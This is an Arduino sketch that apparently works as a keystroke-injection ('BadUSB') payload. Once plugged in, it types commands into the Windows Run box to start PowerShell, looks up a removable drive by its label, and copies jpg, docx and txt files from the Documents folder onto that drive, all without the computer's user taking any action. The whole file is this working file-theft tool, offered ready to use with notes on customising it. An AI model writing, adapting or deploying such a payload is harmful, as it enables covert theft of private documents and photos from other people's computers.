/*
 * This code copys files of the specified type to a removable strorage
 * of the specified name using powershell commands.
 * Your removable storage must have a unique name.
 * The files being copied are in the Documents folder but you can change that.
*/

#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(2000);
  payload();

}

void loop() {
  // nothing here
}

void payload(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("powershell");
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(1500);    // wait for powershell to launch. If it doesn't launch in time, the next keystrokes will be useless
  Keyboard.print("cd Documents");   
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  Keyboard.print("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'NAME' } | select name"); // change NAME to your flash name
  String fileTypes[] = {"jpg","docx","txt"};
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  for (int i = 0; i < sizeof(fileTypes)/sizeof(fileTypes[0]); i++){
    Keyboard.print("copy *." + fileTypes[i] + " $usbpath.name");
    Keyboard.write(0x0D);
    Keyboard.write(0x0A);
    delay(100);
  }
  Keyboard.print("exit");
  Keyboard.write(0x0D);
  Keyboard.write(0x0A);
  delay(100);
  
  
}
